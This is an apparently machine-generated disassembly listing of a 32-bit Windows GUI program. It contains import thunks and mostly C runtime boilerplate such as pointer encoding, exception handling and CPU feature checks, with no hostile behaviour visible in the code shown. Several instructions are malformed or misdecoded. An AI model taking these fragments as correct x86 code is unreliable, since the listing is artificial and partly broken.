jmp [ CreateWindowExW@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
ShowWindow
jmp [ ShowWindow@IAT ]
MoveWindow
jmp [ MoveWindow@IAT ]
DialogBoxParamW
jmp [ DialogBoxParamW@IAT ]
EndDialog
jmp [ EndDialog@IAT ]
GetSystemMetrics
jmp [ GetSystemMetrics@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
GetDC
jmp [ GetDC@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
EndPaint
jmp [ EndPaint@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
AdjustWindowRect
jmp [ AdjustWindowRect@IAT ]
SetCursor
jmp [ SetCursor@IAT ]
IntersectRect
jmp [ IntersectRect@IAT ]
LoadCursorW
jmp [ LoadCursorW@IAT ]
LoadIconW
jmp [ LoadIconW@IAT ]
LoadStringW
jmp [ LoadStringW@IAT ]
BitBlt
jmp [ BitBlt@IAT ]
CreateCompatibleBitmap
jmp [ CreateCompatibleBitmap@IAT ]
CreateCompatibleDC
jmp [ CreateCompatibleDC@IAT ]
DeleteDC
jmp [ DeleteDC@IAT ]
DeleteObject
jmp [ DeleteObject@IAT ]
SelectObject
jmp [ SelectObject@IAT ]
CreatePen
jmp [ CreatePen@IAT ]
LineTo
jmp [ LineTo@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
SHGetSpecialFolderPathW
jmp [ SHGetSpecialFolderPathW@IAT ]
CoInitialize
jmp [ CoInitialize@IAT ]
CoUninitialize
jmp [ CoUninitialize@IAT ]
CoCreateInstance
jmp [ CoCreateInstance@IAT ]
sub_40c377
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call j_sub_42d3b1
pop ecx
pop ebp
retn
sub_40c385
push ebp
mov ebp esp
pop ebp
jmp sub_40c344
sub_40c5bf
mov ecx [ ebp - 0x14 ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
push ecx
push eax
call sub_429a7c
pop ecx
pop ecx
retn
sub_40c602
call sub_40cf99
push eax
call sub_42a660
pop ecx
retn
sub_40c60f
push 0x2
pop eax
retn
j_sub_42a72c#2
jmp j_sub_42a72c
sub_40c618
call sub_40d13d
movzx eax ax
push eax
call sub_42af94
push eax
push 0x0
push __dos_header
call sub_4061b0
retn
_start
call sub_40cefa
jmp sub_40c48c
sub_40c63e
push ebp
mov ebp esp
and [ ecx + 0x4 ] 0x0
and [ ecx + 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
mov [ ecx ] r--data
pop ebp
retn 0x4
sub_40c67c
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40c6b5
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40c6f9
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] r--data
and [ ecx + 0x4 ] 0x0
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x8
sub_40c716
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_40e734
pop ecx
retn
sub_40c727
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_40e734
pop ecx
retn
sub_40c738
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_40e734
pop ecx
retn
sub_40c7d0
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
call sub_40c67c
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_40e753
int3
sub_40c7ed
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
call sub_40c6b5
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_40e753
int3
j_sub_42d3b1
jmp j_sub_42d3b1#3
sub_40c81c
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_40c93f
push ebp
mov ebp esp
push 0x8
call sub_40c94b
pop ebp
retn
sub_40cb31
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_40cb62
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
ror eax cl
pop ebp
retn
sub_40cbe6
mov eax [ fs : 0x18 ]
retn
sub_40cc22
call sub_40d496
test eax eax
je r-xdata
call j_sub_42a72c
call sub_40d2f5
jmp r-xdata
mov al 0x1
retn
sub_40cc3a
push 0x0
call sub_40cd10
test al al
pop ecx
setne al
retn
sub_40cc48
call sub_40e7ef
test al al
jne r-xdata
call sub_42d15a
test al al
jne r-xdata
xor al al
retn
mov al 0x1
retn
call sub_40e7fa
jmp r-xdata
sub_40cc67
call sub_42d165
call sub_40e7fa
mov al 0x1
retn
sub_40cca7
call sub_40d496
test eax eax
je r-xdata
call sub_4171da
test eax eax
je sub_4171b5
push rw-data
call sub_42cf99
pop ecx
retn
retn
sub_40ccca
push 0x0
call sub_42d17f
pop ecx
jmp sub_40e829
sub_40ce0f
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_40ce34
push ebp
mov ebp esp
call sub_40d496
test eax eax
je r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov ecx rw-data
xchg [ ecx ] eax
sub_40cee5
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40ce79
neg eax
pop ecx
sbb eax eax
neg eax
dec eax
pop ebp
retn
sub_40cf96
xor eax eax
retn
sub_40cf99
xor eax eax
inc eax
retn
sub_40cf9d
xor eax eax
retn
sub_40cfa0
mov eax 0x4000
retn
sub_40cfa6
xor eax eax
retn
sub_40cfa9
xor eax eax
retn
sub_40cfac
push rw-data
call [ InitializeSListHead@IAT ]
retn
sub_40cfb8
push rw-data
call sub_40e984
pop ecx
retn
sub_40cfc4
push 0x30000
push 0x10000
push 0x0
call sub_42d191
add esp 0xc
test eax eax
jne r-xdata
push 0x7
call sub_40d022
int3
retn
sub_40cfe5
retn
sub_40cfe6
retn
sub_40cfe7
mov eax rw-data
retn
sub_40cfed
call sub_4019d0
mov ecx [ eax + 0x4 ]
or [ eax ] 0x4
mov [ eax + 0x4 ] ecx
call sub_40cfe7
mov ecx [ eax + 0x4 ]
or [ eax ] 0x2
mov [ eax + 0x4 ] ecx
retn
sub_40d00a
xor eax eax
cmp [ rw-data ] eax
sete al
retn
sub_40d016
mov eax rw-data
retn
sub_40d01c
mov eax rw-data
retn
sub_40d170
xor eax eax
retn
sub_40d1b7
push sub_40d1c3
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_40d2b6
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx

sub_40d2cb
mov [ ecx ] r--data
retn
sub_40d496
xor eax eax
cmp [ rw-data ] eax
setne al
retn
sub_40d4a2
retn
sub_40d4a3
mov ecx [ r--data ]
xor eax eax
cmp ecx sub_40d4a2
setne al
retn
sub_40e31e
retn
sub_40e359
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
and [ ecx + 0x4 ] 0x0
and [ ecx + 0xc ] 0x0
mov [ ecx ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
pop ebp
retn
sub_40e374
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jle r-xdata
pop ebp
retn
movzx eax ax
or eax 0x80070000
sub_40e4c0
xor eax eax
push eax
push eax
push eax
push rw-data
call sub_401000
add esp 0x10
retn
sub_40e4d3
push rw-data
call sub_401088
pop ecx
retn
sub_40e67a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call j_sub_42d3b1#3
pop ecx
pop ebp
retn 0x4
sub_40e68a
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_40e698
push esi
mov esi ecx
push [ esi ]
call j_sub_42d3b1#3
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e6a8
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e6b0
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_40e6b6
mov eax [ ecx ]
retn
sub_40e6b9
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e6c1
push esi
mov esi ecx
push [ esi ]
call j_sub_42d3b1#3
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e7ef
call sub_40eb69
test eax eax
setne al
retn
sub_40e7fa
push 0x0
call sub_40eb25
pop ecx
mov al 0x1
retn
sub_40e829
call sub_40ec14
mov al 0x1
retn
sub_40e831
retn
j_sub_42d3b1#2
jmp sub_42d3b1
sub_40e837
push ebp
mov ebp esp
pop ebp
jmp sub_42d3eb
sub_40e840
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_40e850
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_40e860
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_40e872
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_40e884
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
xor eax eax
[ ecx ] edx
pop ebp
retn
sub_40e894
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_40e8a2
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_40e8b0
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e8c0
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e8d0
mov eax j_sub_42d3b1#2
retn
sub_40e8d6
mov eax sub_40e837
retn
sub_40e8dc
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e8e4
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e8ec
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_40e8fc
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3eb
pop ecx
pop ebp
retn 0x4
sub_40e90c
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_40e912
mov eax [ ecx ]
retn
sub_40e915
mov eax [ ecx ]
retn
sub_40e918
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e920
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40e928
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40e938
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40ea98
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_42d3b1
pop ecx
pop ebp
retn 0x4
sub_40eaa8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
pop ebp
retn 0x4
sub_40eab6
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40eac6
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40eace
mov eax [ ecx ]
and [ ecx ] 0x0
retn
sub_40ead4
mov eax [ ecx ]
retn
sub_40ead7
xor eax eax
cmp [ ecx ] eax
setne al
retn
sub_40eadf
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
and [ esi ] 0x0
pop ecx
pop esi
retn
sub_40eaef
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_4103fd
test eax eax
pop ecx
pop ecx
setne al
pop ebp
retn
sub_40eb09
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
cmp eax rw-data
je r-xdata
push eax
call sub_42d3b1
pop ecx
sub_40ec14
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
retn
push eax
call sub_410389
or [ rw-data ] 0xffffffff
pop ecx
sub_40ecdc
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40ece5
mov esp [ ebp - 0x18 ]
call sub_42d238
sub_40ed31
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40ed49
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_40e734
pop ecx
retn
sub_40ee2f
push [ ebp - 0x14 ]
call sub_40f016
pop ecx
retn
sub_40ef61
push 0x4
mov eax sub_44c34a
call sub_448b03
call sub_40eb5b
cmp [ eax + 0x1c ] 0x0
jne r-xdata
call sub_42d238
and [ ebp - 0x4 ] 0x0
call sub_41683b
sub_40f5b4
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40f5bb
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40f5c2
pop eax
pop ecx
xchg [ esp ] eax
jmp eax
sub_40f5c9
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
setne al
pop ebp
retn
sub_40f5d5
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
setne al
pop ebp
retn
sub_40f5e1
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
setne al
pop ebp
retn
sub_40f5ed
lea eax [ ecx + 0x8 ]
retn
sub_40f5f1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40f6a8
xor eax eax
inc eax
retn
sub_40f6ac
mov esp [ ebp - 0x18 ]
call sub_42d238
sub_40f7d3
xor eax eax
inc eax
retn
sub_40f97e
push 0x10
pop eax
retn
sub_40fbeb
push [ ebp - 0x14 ]
call sub_40fb30
pop ecx
retn
sub_40fc29
call sub_40eb5b
cmp [ eax + 0x18 ] 0x0
jle r-xdata
retn
call sub_40eb5b
dec [ eax + 0x18 ]
sub_40fe15
call sub_40eb5b
add eax 0x10
retn
sub_40fe1e
call sub_40eb5b
add eax 0x14
retn
sub_40fe27
call sub_40eb5b
add eax 0x18
retn
j_sub_42d238
jmp sub_42d238
sub_40fef0
retn
sub_40fef1
retn
sub_40fef2
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_40ff0a
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_40ff1e
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_40ff3b
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_40ff4d
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_40ff5f
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_40ff6c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_40ff79
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_40ff86
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
xor eax eax
[ ecx ] edx
pop ebp
retn
sub_40ff96
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
xor eax eax
[ ecx ] edx
pop ebp
retn
sub_40ffa6
push ebp
mov ebp esp
push ecx
mov al [ ebp - 0x1 ]
mov esp ebp
pop ebp
retn
sub_40ffb1
or eax 0xffffffff
retn
sub_40ffb5
push r--data
push r--data
push r--data
push 0x0
call sub_4100c1
add esp 0x10
retn
sub_40ffcf
push r--data
push r--data
push r--data
push 0x1
call sub_4100c1
add esp 0x10
retn
sub_40ffe9
push r--data
push r--data
push r--data
push 0x2
call sub_4100c1
add esp 0x10
retn
sub_410003
push r--data
push r--data
push r--data
push 0x3
call sub_4100c1
add esp 0x10
retn
sub_41001d
push r--data
push r--data
push r--data
push 0x4
call sub_4100c1
add esp 0x10
retn
sub_410037
push r--data
push r--data
push r--data
push 0x5
call sub_4100c1
add esp 0x10
retn
sub_410051
push r--data
push r--data
push r--data
push 0x6
call sub_4100c1
add esp 0x10
retn
sub_41006b
push r--data
push r--data
push r--data
push 0x7
call sub_4100c1
add esp 0x10
retn
sub_410085
push r--data
push r--data
push r--data
push 0x8
call sub_4100c1
add esp 0x10
retn
sub_4105f5
mov ebp edx
mov esi ecx
mov eax ecx
push 0x1
call sub_4167d5
xor eax eax
xor ebx ebx
xor ecx ecx
xor edx edx
xor edi edi
jmp esi
sub_410627
push ebp
mov ebp [ esp + 0x8 ]
push edx
push ecx
push [ esp + 0x14 ]
call sub_4104e0
add esp 0xc
pop ebp
retn 0x8
sub_41067a
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_4106be
push ebp
mov ebp esp
imul eax [ ebp + 0x8 ] 0x18
add eax rw-data
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_4106d3
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_4106eb
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_410708
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ rw-data ] eax
retn
sub_410725
and [ ecx ] 0x0
mov eax ecx
retn
sub_4107e4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x4
sub_4108f0
and [ ecx ] 0x0
mov eax ecx
mov [ ecx + 0x4 ] 0x0
and [ ecx + 0x4 ] 0xffff00ff
retn
sub_410a05
mov [ ecx ] r--data
mov eax ecx
retn
sub_410a31
or [ ecx ] 0xffffffff
mov eax ecx
retn
sub_410aa0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
mov [ ecx + 0x4 ] al
mov eax ecx
mov [ ecx ] r--data
pop ebp
retn 0x4
sub_410add
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
or [ ecx + 0xc ] 0xffffffff
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x8 ] eax
mov eax ecx
mov [ ecx ] r--data
pop ebp
retn 0x8
sub_410b55
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov ecx rw-data
push [ ebp + 0x8 ]
call sub_413de0
pop ebp
retn
sub_410b6a
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov [ ecx ] eax
mov eax [ edx + 0x4 ]
mov [ ecx + 0x4 ] eax
mov eax ecx
pop ebp
retn 0x4
sub_411128
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
xor eax eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
pop ebp
retn 0x8
sub_411f03
mov eax [ rw-data ]
shr eax 0x7
not eax
and eax 0x1
retn
sub_411f11
mov eax [ rw-data ]
shr eax 0x4
not eax
and eax 0x1
retn
sub_411f1f
mov eax [ rw-data ]
shr eax 0x3
not eax
and eax 0x1
retn
sub_411f2d
mov eax [ rw-data ]
shr eax 0xf
not eax
and eax 0x1
retn
sub_411f3b
mov eax [ rw-data ]
shr eax 0x12
not eax
and eax 0x1
retn
sub_411f49
mov eax [ rw-data ]
shr eax 0x2
not eax
and eax 0x1
retn
sub_411f57
mov eax [ rw-data ]
shr eax 0x1
not eax
and eax 0x1
retn
sub_411f64
mov eax [ rw-data ]
shr eax 0x9
not eax
and eax 0x1
retn
sub_411f72
mov eax [ rw-data ]
and eax 0x1000
retn
sub_411f7d
mov eax [ rw-data ]
and eax 0x10000
retn
sub_412012
mov eax [ rw-data ]
shr eax 0x11
not eax
and eax 0x1
retn
sub_412020
mov eax [ rw-data ]
shr eax 0x13
not eax
and eax 0x1
retn
sub_41202e
mov ecx [ rw-data ]
xor eax eax
and ecx 0x60
cmp cl 0x60
setne al
retn
sub_412040
mov eax [ rw-data ]
shr eax 0x8
not eax
and eax 0x1
retn
sub_41204e
mov eax [ rw-data ]
and eax 0x2000
retn
sub_412059
mov eax [ rw-data ]
not eax
and eax 0x1
retn
sub_4128d1
add al [ ebx ]
add eax [ 0xffffffffec8b5504 ]
push 0x0
push [ ebp + 0x8 ]
call sub_413322
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4134b4
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
call sub_413322
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_4135e5
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_414e25
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_413d0d
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_413322
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_413d40
cmp [ ecx + 0x4 ] 0x1
setne al
dec al
and al 0x20
retn
sub_413d4c
mov al [ ecx + 0x4 ]
retn
sub_413d50
mov ecx [ ecx + 0x4 ]
test ecx ecx
jne sub_413d21
xor al al
retn
sub_413d91
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
xor al al
retn
mov eax [ ecx + 0x4 ]
mov al [ eax + edx - 0x1 ]
retn
sub_4144f5
push ebp
mov ebp esp
push r--data
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41480e
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_414513
push ebp
mov ebp esp
push r--data
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41480e
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_41490a
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41480e
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_414f73
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_412fcb
mov eax [ ebp + 0x8 ]
pop ecx
pop ebp
retn
sub_41502d
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
pop ebp
retn 0x8
mov cl [ ecx + 0x4 ]
mov [ eax ] cl
inc eax
sub_415042
push ebp
mov ebp esp
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
pop ebp
jmp sub_414f84
sub_41509d
push ebp
mov ebp esp
push [ ecx + 0x8 ]
push [ ecx + 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41515b
add esp 0x10
pop ebp
retn 0x8
sub_415f20
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415f8b
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_416330
mov eax [ rw-data ]
and eax 0x4000
retn
sub_41633b
mov eax [ ecx + 0x4 ]
shr eax 0xb
and eax 0x1
retn
sub_416345
mov eax [ ecx + 0x4 ]
shr eax 0xe
and eax 0x1
retn
sub_41634f
xor eax eax
cmp [ ecx ] eax
sete al
retn
sub_416357
xor eax eax
cmp [ ecx ] 0x9
sete al
retn
sub_416360
mov eax [ ecx + 0x4 ]
shr eax 0xc
and eax 0x1
retn
sub_41636a
mov eax [ ecx + 0x4 ]
shr eax 0xd
and eax 0x1
retn
sub_416374
mov eax [ ecx + 0x4 ]
shr eax 0x8
and eax 0x1
retn
sub_41637e
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x200
je r-xdata
inc eax
sub_41638f
xor eax eax
cmp [ ecx ] eax
je r-xdata
retn
test [ ecx + 0x4 ] 0x400
je r-xdata
inc eax
sub_4163a0
mov eax [ ecx + 0x4 ]
shr eax 0xf
and eax 0x1
retn
sub_4163aa
xor eax eax
cmp [ ecx + 0x4 ] 0x1
setle al
retn
sub_4163d2
mov eax [ ecx + 0x8 ]
retn
sub_4163d6
xor eax eax
inc eax
retn
sub_4163da
mov ecx [ ecx + 0x4 ]
test ecx ecx
jne sub_4163b4
xor eax eax
retn
sub_416432
mov eax [ ecx + 0x8 ]
retn
sub_4164bc
or [ ecx + 0x4 ] 0x800
retn
sub_4164c4
or [ ecx + 0x4 ] 0x4000
retn
sub_4164cc
or [ ecx + 0x4 ] 0x1000
retn
sub_4164d4
or [ ecx + 0x4 ] 0x2000
retn
sub_4164dc
cmp [ ecx ] 0x0
je r-xdata
retn
or [ ecx + 0x4 ] 0x200
sub_4164e9
or [ ecx + 0x4 ] 0x8000
retn
sub_4164f1
or [ ecx + 0x4 ] 0x100
mov eax ecx
retn
sub_4164fb
movsx eax [ ecx + 0x4 ]
retn
sub_416521
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp [ ecx ] al
je r-xdata
pop ebp
retn
inc eax
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
sub_4165f4
push esi
call sub_4106be
pop ecx
retn
sub_416689
push esi
call sub_4106be
pop ecx
retn
sub_4167a9
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_4166e0
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_4167f4
call eax
retn
sub_4167f7
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
pop ebp
retn
mov eax sub_42d238
sub_41680b
call sub_40eb5b
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax sub_42d238
sub_41681d
push ebp
mov ebp esp
call sub_40eb5b
mov edx eax
mov eax [ edx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ edx + 0x4 ] ecx
pop ebp
retn
mov eax sub_42d238
sub_41683b
push esi
call sub_40eb5b
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
call sub_42d238
mov ecx esi
call j_sub_40d4a2
call esi
sub_416dd4
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_416de8
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
[ ecx ] edx
pop ebp
retn
sub_416dfa
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xchg [ ecx ] eax
pop ebp
retn
sub_416e07
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor edx edx
xor eax eax
[ ecx ] edx
pop ebp
retn
sub_416e17
xor ecx ecx
mov edx rw-data
xor eax eax
[ edx ] ecx
mov ecx [ rw-data ]
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
retn
sub_416e36
push esi
call sub_416e17
mov esi eax
test esi esi
je r-xdata
call sub_42d45a
mov ecx esi
call j_sub_40d4a2
call esi
sub_416e76
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
retn
sub_416e8e
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
mov ecx eax
xor eax [ ebp + 0x8 ]
and ecx 0x1f
ror eax cl
pop ebp
retn
sub_416ec3
mov edi edi
push ebp
mov ebp esp
